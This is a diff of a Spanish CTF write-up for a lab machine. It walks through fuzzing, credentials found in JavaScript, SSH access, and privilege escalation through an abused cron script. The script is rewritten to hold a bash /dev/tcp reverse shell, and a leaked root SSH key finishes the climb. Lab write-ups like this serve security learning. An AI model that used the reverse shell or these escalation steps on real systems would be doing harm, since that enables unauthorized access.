@@ -20,18 +20,18 @@ Se observan dos puertos:
 22/tcp SSH 80/tcp HTTP
 <br>
 Accedemos a la página web en el puerto 80 y encontramos una pagina web la cual parece un sitio empresarial, con un apartado sobre nosotros, formulario de contacto y login. Asi que nos centraremos en intentar acceder.
-<br>
+
 ![visualizar la web](/img/cyberguard/cg-3.png)
-<br>
+
 ![visualizar login](/img/cyberguard/cg-4.png)
-<br>
+
 Para intentar acceder al login podemos probar con fuerza bruta o buscar si hay credenciales escondidos en el código fuente o simplemente por algun fichero de la web, para ello vamos a hacer algo de fuzzing web para ver si podemos ver algo mas o fichero con credenciales y ver el código fuente.
-<br>
+
 #### Código Fuente
-<br>
+
 ![Codigo](/img/cyberguard/cg-5.png)
 no vemos mucha cosa aqui
-<br>
+
 #### Fuzzing Web
 
 ```bash
@@ -60,26 +60,26 @@ Finished
 ===============================================================
 ```
 ---
-<br>
+
 Podemos ver que tenemos el típico directorio de imagenes y uno llamado archiv el cual accederemos para ver su contenido.
-<br>
+
 ![Dir Archiv](/img/cyberguard/cg-6.png)
 Vemos que hay dos ficheros 
-<br>
+
 Fichero con extensión .js el cual podemos ver que al final hay un apartado de credenciales validas, lo podria servidornos tal vez para iniciar sesion en la pagina web.
-<br>
+
 ![cg-7](/img/cyberguard/cg-7.png)
-<br>
+
 ![cg-8](/img/cyberguard/cg-8.png)
-<br>
+
 Iniciamos sesión y parece ser que hay como estadísticas o algo relación con la empresa, pero hay tres usuarios de los cuales podemos deducir que admin y cliente pertenecerán a la web, pero tal vez como el servidor tiene también habilitado SSH podemos intentar de acceder mediante ssh con el usuario Chloe.
 
 ## 🚀 Explotación
 
 Accedemos mediante ssh usando el usuario Chloe que encontramos en la configuración de javascript, ya que hay un pequeño fallo de validación de credenciales de lado del cliente mediante javascript.
-<br>
+
 ![cg-9](/img/cyberguard/cg-9.png)
-<br>
+
 Buscamos si existen mas usuarios en en el sistema y si podemos ver sus archivos.
 
 ```bash
@@ -141,15 +141,15 @@ chloe@e8cb173e3a20:~$
 
 
 Revisando el de veronica que es el unico que podemos acceder a parte de chloe vemos algo que parece una contresaña.
-<br>
+
 ![cg-10](/img/cyberguard/cg-10.png)
-<br>
+
 Esta vez conseguimos acceder con veronica, y revisamos que podemos usar sudo, binarios suid y alguna tarea programada que quiza podamos explotar.
-<br>
+
 ![cg-11](/img/cyberguard/cg-11.png)
-<br>
+
 vale al parecer con crontab hay una tarea programada para que corra un script que hay en un directorio de la carpeta .local en el directorio de veronica, pero es un poco engañoso ya que no existe el usuario pedro en el sistema y la tarea no puede estar cumpliendose. 
-<br>
+
 Pero tal vez lo que podemos hacer es intentar cambiar el usuario pedro por pablo que si que existe y ver si ejecuta el script.
 
 ##### Cambiamos el usuario
@@ -157,24 +157,23 @@ Pero tal vez lo que podemos hacer es intentar cambiar el usuario pedro por pablo
 
 ##### Compromas si en el directorio /tmp/hora/hora.log aparece la ejecución
 ![cg-12](/img/cyberguard/cg-12.png)
-<br>
+
 
 ![cg-13](/img/cyberguard/cg-13.png)
-<br>
+
 viendo los permisos del script solo puede escribir pablo y miembros del grupo taller, así que viendo los grupos de veronica podemos intentar modificarlo para que saque una shell.
-<br>
+
 modificamos el script con una reverse shell 
 veronica@e8cb173e3a20:~/.local$ nano script-h.sh 
 veronica@e8cb173e3a20:~/.local$ cat script-h.sh 
 #!/bin/bash
 
-<br>
 
 bash -i >& /dev/tcp/172.17.0.1/443 0>&1
 veronica@e8cb173e3a20:~/.local$ 
 
 y luego en nuestra maquina abrimos un netcat apuntando en mi caso al puerto 443, y nos abrira una shell con el usuario pablo, esperando unos minutos.
-<br>
+
 ![cg-14](/img/cyberguard/cg-14.png)
 
 Dentro de pablo ahora vemos lo que hay en su directorio personal
@@ -231,29 +230,29 @@ y podemos usar un script en python que hay en /opt-nllns asi vamos a ello.
 
 verificamos que existe
 ![cg-15](/img/cyberguard/cg-15.png)
-<br>
+
 y examinando el script podemos ver que usando un enlace simbolico apuntando a una imagen lo borrara si contiene una ruta critica como /etc o /root o de lo contrario movera a /var/quarantine, entonces si queremos leer el fichero root.txt que nos menciono en importante.txt debemos intentar que el script no nos lo borre ocultando así la palabra root.
-<br>
+
 le pasamos un fichero que no se encuentro en /etc o /root y el script nos lo muestra
 ![cg-16](/img/cyberguard/cg-16.png)
-<br>
+
 Le pasamos el fichero /root/root.txt y nos lo borrara
 
 ![cg-17](/img/cyberguard/cg-17.png)
-<br>
+
 Para ello lo que tendriamos que hacer ya que el fichero a leer se encuentra en /root, seria crear un doble enlace simbolico primero a un directorio en el sea por ejemplo /tmp/safe y crear el enlace simbolico de /root/root.txt a /tmp/safe y de /tmp/safe/root.txt enviarlo a /home/pablo/Images/foto.jpg para que asi lea la segunda ruta y no vea la palabra root.
 
 ![cg-18](/img/cyberguard/cg-18.png)
-<br>
+
 Pero esto creo que es una distraccion ya que encontre un id_rsa en la carpeta /tmp que parecer ser de root.
 
 ![cg-19](/img/cyberguard/cg-19.png)
-<br>
+
 Nos lo traemos a un nuestra maquina y le damos permiso chmod 600 id_rsa
 y con ssh -i id_rsa root@172.17.0.2, nos debe devolver la shell como root
 
 ![cg-20](/img/cyberguard/cg-20.png)
-<br>
+
 ---
 
 ## 🎯 Conclusiones
